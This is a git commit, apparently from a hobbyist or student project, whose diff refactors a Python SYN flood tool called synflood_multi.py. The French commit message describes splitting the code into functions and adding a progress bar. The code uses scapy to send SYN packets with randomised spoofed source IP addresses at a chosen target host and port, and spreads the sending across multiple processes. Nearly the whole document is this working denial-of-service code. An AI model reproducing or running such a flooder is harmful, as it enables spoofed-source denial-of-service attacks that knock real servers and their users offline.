409e25e0f0ee2f560a12997f7ca320ac33f1fe05
Macareux-moine <fakirefak@gmail.com>
2024-04-27 21:30:29 +0200

    changement du code pour un code plus petit et surtout remanie avec de def et le processus dans un def syn  avec la barre de progression et un def envois qui ne va gere que envois, je suis donc pas sur de utilité de ma classe ENVOIS, je suis pas sur avoir bien compris finalement pour le moment

--- synflood/modules/synflood_multi.py
+++ synflood/modules/synflood_multi.py
@@ -1,32 +1,30 @@
+from barre_de_progression import barre
 from scapy.all import *
 import multiprocessing
-from demmande_user import DemandeUtilisateur
+from demande_user import DemandeUtilisateur
 
 class ENVOIS:
 
-    @staticmethod
+   
     def syn(cible, port, nbrpaquet, nbr_processus):
         # Boucle pour envoyer des paquets SYN
+        packets_per_process = nbrpaquet // nbr_processus
+        for _ in range(nbr_processus):
+            # Création des processus pour envoyer les paquets SYN en parallèle
+            p = multiprocessing.Process(target=ENVOIS.envois, args=(cible, port, packets_per_process))
+            p.start()
+
+
+
+        barre(nbrpaquet)
+        
+    def envois(cible, port, nbrpaquet):
         for _ in range(nbrpaquet):
             # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
             ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
             tcpsyn = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
             # Envoie paquet
             send(ip/tcpsyn, verbose=False)
-
-        # Création des processus pour envoyer les paquets SYN en parallèle
-        processus = []
-        for _ in range(nbr_processus):
-            p = multiprocessing.Process(target=ENVOIS.syn, args=(cible, port, nbrpaquet // nbr_processus, 1))
-            processus.append(p)
-
-        # Démarrage des processus
-        for p in processus:
-            p.start()
-
-        # Attendre que tous les processus se terminent
-        for p in processus:
-            p.join()
 
 if __name__ == "__main__":
     # Utilisation de la classe DemandeUtilisateur pour obtenir les informations de l'utilisateur
